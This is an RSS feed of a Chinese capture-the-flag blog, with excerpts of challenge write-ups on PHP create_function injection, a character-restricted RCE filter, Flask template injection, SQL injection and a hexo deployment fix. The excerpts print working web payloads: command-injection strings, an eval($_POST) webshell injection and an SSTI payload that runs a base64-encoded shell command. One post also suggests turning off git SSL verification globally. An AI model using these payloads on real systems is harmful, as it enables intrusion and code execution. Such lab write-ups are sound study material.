<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Thu, 12 Feb 2026 17:48:35 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>ACTF2020新生赛</title><link>https://baozongwi.xyz/p/actf2020-newcomer-competition/</link><guid>https://baozongwi.xyz/p/actf2020-newcomer-competition/</guid><pubDate>Sun, 11 Aug 2024 15:02:08 +0000</pubDate><description>刷</description><content:encoded>[ACTF2020 新生赛]Exec 一个非常简单的命令执行
1 2 ;ls / ;tac /f* [ACTF2020 新生赛]Include 随便怎么打都通,vps远程包含,filter协议等等
1 …</content:encoded></item><item><title>SUCTF2019</title><link>https://baozongwi.xyz/p/suctf2019/</link><guid>https://baozongwi.xyz/p/suctf2019/</guid><pubDate>Sun, 11 Aug 2024 10:42:05 +0000</pubDate><description>刷</description><content:encoded>[SUCTF 2019]EasySQL 堆叠注入 首先查表
1 1;show tables; 如何查flag呢,猜测后端语句为
1 select $post[&amp;amp;amp;#39;query&amp;amp;amp;#39;]||flag from Flag 那么涉及特性
SQL_MOD：是MySQL支持的基本语法、校验规则 其 …</content:encoded></item><item><title>create_function()注入</title><link>https://baozongwi.xyz/p/create-function-injection/</link><guid>https://baozongwi.xyz/p/create-function-injection/</guid><pubDate>Sat, 10 Aug 2024 18:45:05 +0000</pubDate><description>0x01 前言 对于这个函数,我之前一直是一知半解,基本就是知道一个闭合,然后嵌入恶意代码就啥都不知道了,昨天遇到了一个相关知识点,来彻底搞懂他
0x02 内容 了解 首先去官方手册看看这个函数
也就是说和eval有着异曲同工之妙
我们都知道eval()会使内置语句php解析,所以我们用;等闭合内部语句,然后代码执行,那么现在来看看这个
实验 首先最基本的用法创建匿名函数
1 create_function(&amp;amp;#39;$name&amp;amp;#39;,&amp;amp;#39;echo $name.&amp;amp;#34;wi&amp;amp;#34;&amp;amp;#39;) 等价
1 2 3 function fT($fname) { echo $fname.&amp;amp;#34;wi&amp;amp;#34;; } 那么这样一看就很明白了
随便写个代码
1 2 3 4 5 6 7 8 9 &amp;amp;lt;?php $id=$_GET[&amp;amp;#39;id&amp;amp;#39;]; $str2=&amp;amp;#39;echo $a&amp;amp;#39;.&amp;amp;#39;test&amp;amp;#39;.$id.&amp;amp;#34;;&amp;amp;#34;; echo $str2; echo &amp;amp;#34;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;#34;; echo &amp;amp;#34;==============================&amp;amp;#34;; echo &amp;amp;#34;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;#34;; $f1 = create_function(&amp;amp;#39;$a&amp;amp;#39;,$str2); ?&amp;amp;gt; 起一个环境
此时所创建的函数应该为
1 2 3 4 5 6 7 function fT($a) { echo $a.&amp;amp;#39;test&amp;amp;#39;.$id.; } 变为 function fT($a){ echo $a.&amp;amp;#39;test&amp;amp;#39;;}eval($_POST[&amp;amp;#39;a&amp;amp;#39;]);/*; } 那么后续代码都会被注释,且我们也成功注入
例题 一道很简单的题目(P神出的)
1 2 3 4 5 6 7 8 9 &amp;amp;lt;?php $action = $_GET[&amp;amp;#39;action&amp;amp;#39;] ?? &amp;amp;#39;&amp;amp;#39;; $arg = $_GET[&amp;amp;#39;arg&amp;amp;#39;] ?? &amp;amp;#39;&amp;amp;#39;; if(preg_match(&amp;amp;#39;/^[a-z0-9_]*$/isD&amp;amp;#39;, $action)) { show_source(__FILE__); } else { $action(&amp;amp;#39;&amp;amp;#39;, $arg); } 这里我们使用\来绕过</description><content:encoded>0x01 前言 对于这个函数,我之前一直是一知半解,基本就是知道一个闭合,然后嵌入恶意代码就啥都不知道了,昨天遇到了一个相关知识点,来彻底搞懂他
0x02 内容 了解 首先去官方手册看看这个函数
也就是说和eval有着异曲同工之妙
我们都知道eval()会使内置语句php解析,所以我们用;等闭合内部 …</content:encoded></item><item><title>记一次RCE</title><link>https://baozongwi.xyz/p/rce-case-study/</link><guid>https://baozongwi.xyz/p/rce-case-study/</guid><pubDate>Fri, 09 Aug 2024 17:30:24 +0000</pubDate><description>0x01 前言 今天随便搞了一个比赛,结果吧,我勒个刚,第一个RCE就绕不出来
0x02 action 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 &amp;amp;lt;?php error_reporting(0); highlight_file(__FILE__); function count_string_char($str) { $arr = []; foreach (str_split($str) as $value) { if (!in_array($value, $arr)) { array_push($arr, $value); } } return sizeof($arr); } if (isset($_POST[&amp;amp;#39;cmd&amp;amp;#39;]) &amp;amp;amp;&amp;amp;amp; is_string($_POST[&amp;amp;#39;cmd&amp;amp;#39;])) { $cmd = $_POST[&amp;amp;#39;cmd&amp;amp;#39;]; $c = count_string_char($cmd); if ($c &amp;amp;gt; 13) { die(&amp;amp;#34;$c too long&amp;amp;#34;); } if ( preg_match(&amp;amp;#39;/[a-z0-9]|&amp;amp;lt;|&amp;amp;gt;|\\?|\\[|\\]|\\*|@|\\||\\^|~|&amp;amp;amp;|\s/i&amp;amp;#39;, $cmd) ) { die(&amp;amp;#34;nonono&amp;amp;#34;); } eval( &amp;amp;#34;print($cmd);&amp;amp;#34; ); } else { exit(); } 首先观察这个function先,我就是理解错了,他的意思是将不重复的字符记在数组之中</description><content:encoded>0x01 前言 今天随便搞了一个比赛,结果吧,我勒个刚,第一个RCE就绕不出来
0x02 action 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 &amp;amp;amp;lt;?php …</content:encoded></item><item><title>极客大挑战2020</title><link>https://baozongwi.xyz/p/geek-challenge-2020/</link><guid>https://baozongwi.xyz/p/geek-challenge-2020/</guid><pubDate>Fri, 09 Aug 2024 13:34:40 +0000</pubDate><description>刷</description><content:encoded>[极客大挑战 2020]Cross 先反弹shell
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 …</content:encoded></item><item><title>hexo部署到GitHub的一场血案</title><link>https://baozongwi.xyz/p/hexo-github-deployment-troubleshooting/</link><guid>https://baozongwi.xyz/p/hexo-github-deployment-troubleshooting/</guid><pubDate>Thu, 08 Aug 2024 21:19:14 +0000</pubDate><description>0x01 前言 介于第一个友链的诞生，那我必须得第一时间部署blog到GitHub，但是确实并没有那么顺畅，于是找到了几种方法来解决这个问题
0x02 action ssl错误 这个可能是ssl证书或者是短暂的，但是不说那么多，直接上解决方案
首先第一种
将https地址换成ssh链接的
1 2 3 4 deploy: type: git repo: https://github.com/baozongwi/baozongwi.github.io.git/ branch: main 替换为
1 2 3 4 deploy: type: git repo: git@github.com:baozongwi/baozongwi.github.io.git branch: main 第二种，忽略ssl链接
1 git config --global http.sslVerify &amp;amp;#34;false&amp;amp;#34; GitHub超时 首先看看自己网络是否有问题
1 ping github.com 第一种设置proxy
取消proxy
1 2 3 git config --global --unset http.proxy git config --global --unset https.proxy 设置proxy</description><content:encoded>0x01 前言 介于第一个友链的诞生，那我必须得第一时间部署blog到GitHub，但是确实并没有那么顺畅，于是找到了几种方法来解决这个问题
0x02 action ssl错误 这个可能是ssl证书或者是短暂的，但是不说那么多，直接上解决方案
首先第一种
将https地址换成ssh链接的
1 2 3 …</content:encoded></item><item><title>ctfshow2023愚人杯</title><link>https://baozongwi.xyz/p/ctfshow-2023-april-fools-cup/</link><guid>https://baozongwi.xyz/p/ctfshow-2023-april-fools-cup/</guid><pubDate>Thu, 08 Aug 2024 17:32:43 +0000</pubDate><description>ezssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) @app.route(&amp;amp;#39;/hello/&amp;amp;#39;) def hello(name=None): return render_template(&amp;amp;#39;hello.html&amp;amp;#39;,name=name) @app.route(&amp;amp;#39;/hello/&amp;amp;lt;name&amp;amp;gt;&amp;amp;#39;) def hellodear(name): if &amp;amp;#34;ge&amp;amp;#34; in name: return render_template_string(&amp;amp;#39;hello %s&amp;amp;#39; % name) elif &amp;amp;#34;f&amp;amp;#34; not in name: return render_template_string(&amp;amp;#39;hello %s&amp;amp;#39; % name) else: return &amp;amp;#39;Nonononon&amp;amp;#39; 测试出来传参方式之后发现/过滤了 然后我们就直接base64绕过吧
1 url/hello/{{g.pop.__globals__.__builtins__[&amp;amp;#39;__import__&amp;amp;#39;](&amp;amp;#39;os&amp;amp;#39;).popen(&amp;amp;#39;echo dGFjIC9mKg==|base64 -d|sh&amp;amp;#39;).read()}} easy_signin url里面参数很明显但是试了filter协议和flag.php都不行，那看看源码(访问/index.php)
1 https://b64cd330-9b26-4861-9b2c-67fa244be165.challenge.ctf.show/?img=aW5kZXgucGhw 发现一个图片无法显示,查看源代码解码得到flag
easy_flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # app.py from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response app = Flask(__name__) app.secret_key = &amp;amp;#39;S3cr3tK3y&amp;amp;#39; users = { } @app.route(&amp;amp;#39;/&amp;amp;#39;) def index(): # Check if user is loggedin if &amp;amp;#39;loggedin&amp;amp;#39; in session: return redirect(url_for(&amp;amp;#39;profile&amp;amp;#39;)) return redirect(url_for(&amp;amp;#39;login&amp;amp;#39;)) @app.route(&amp;amp;#39;/login/&amp;amp;#39;, methods=[&amp;amp;#39;GET&amp;amp;#39;, &amp;amp;#39;POST&amp;amp;#39;]) def login(): msg = &amp;amp;#39;&amp;amp;#39; if request.method == &amp;amp;#39;POST&amp;amp;#39; and &amp;amp;#39;username&amp;amp;#39; in request.form and &amp;amp;#39;password&amp;amp;#39; in request.form: username = request.form[&amp;amp;#39;username&amp;amp;#39;] password = request.form[&amp;amp;#39;password&amp;amp;#39;] if username in users and password == users[username][&amp;amp;#39;password&amp;amp;#39;]: session[&amp;amp;#39;loggedin&amp;amp;#39;] = True session[&amp;amp;#39;username&amp;amp;#39;] = username session[&amp;amp;#39;role&amp;amp;#39;] = users[username][&amp;amp;#39;role&amp;amp;#39;] return redirect(url_for(&amp;amp;#39;profile&amp;amp;#39;)) else: msg = &amp;amp;#39;Incorrect username/password!&amp;amp;#39; return render_template(&amp;amp;#39;login.html&amp;amp;#39;, msg=msg) @app.route(&amp;amp;#39;/register/&amp;amp;#39;, methods=[&amp;amp;#39;GET&amp;amp;#39;, &amp;amp;#39;POST&amp;amp;#39;]) def register(): msg = &amp;amp;#39;&amp;amp;#39; if request.method == &amp;amp;#39;POST&amp;amp;#39; and &amp;amp;#39;username&amp;amp;#39; in request.form and &amp;amp;#39;password&amp;amp;#39; in request.form: username = request.form[&amp;amp;#39;username&amp;amp;#39;] password = request.form[&amp;amp;#39;password&amp;amp;#39;] if username in users: msg = &amp;amp;#39;Account already exists!&amp;amp;#39; else: users[username] = {&amp;amp;#39;password&amp;amp;#39;: password, &amp;amp;#39;role&amp;amp;#39;: &amp;amp;#39;user&amp;amp;#39;} msg = &amp;amp;#39;You have successfully registered!&amp;amp;#39; return render_template(&amp;amp;#39;register.html&amp;amp;#39;, msg=msg) @app.route(&amp;amp;#39;/profile/&amp;amp;#39;) def profile(): if &amp;amp;#39;loggedin&amp;amp;#39; in session: return render_template(&amp;amp;#39;profile2.html&amp;amp;#39;, username=session[&amp;amp;#39;username&amp;amp;#39;], role=session[&amp;amp;#39;role&amp;amp;#39;]) return redirect(url_for(&amp;amp;#39;login&amp;amp;#39;)) ........ 给了个密钥那肯定是要修改session为admin</description><content:encoded>ezssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) …</content:encoded></item><item><title>浅谈hackbar</title><link>https://baozongwi.xyz/p/hackbar-brief-introduction/</link><guid>https://baozongwi.xyz/p/hackbar-brief-introduction/</guid><pubDate>Thu, 08 Aug 2024 11:53:28 +0000</pubDate><description>新手最喜欢的</description><content:encoded>0x01 前言 这个工具，想必大家是都知道的，但是鉴于hackbar有部分偷懒功能，而且之前学习nodejs污染的时候有师傅说，&amp;amp;amp;ldquo;hackbar的POST不能传json只可以传键值对&amp;amp;amp;rdquo;，所以我觉得还是有必要一说
0x02 安装 鉴于安装过程相当简单，那我就顺便讲讲吧
首先进 …</content:encoded></item></channel></rss>